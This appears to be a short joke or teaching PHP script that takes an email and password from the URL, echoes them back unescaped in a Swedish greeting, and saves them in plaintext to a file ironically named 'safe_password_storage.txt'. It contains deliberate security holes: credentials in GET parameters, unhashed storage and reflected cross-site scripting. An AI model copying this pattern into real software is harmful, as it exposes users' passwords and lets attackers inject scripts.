<?php

$myfile = fopen("safe_password_storage.txt", "w") or die("Unable to open file!");

echo 'Hallå där ' . $_GET["email"] . 
'! Ditt lösenord - ' . $_GET["password"] . 
' - har lagts till i passwords_greatest_hits.txt';

fwrite($myfile, $_GET["email"] . ' / ' . $_GET["password"]);
?>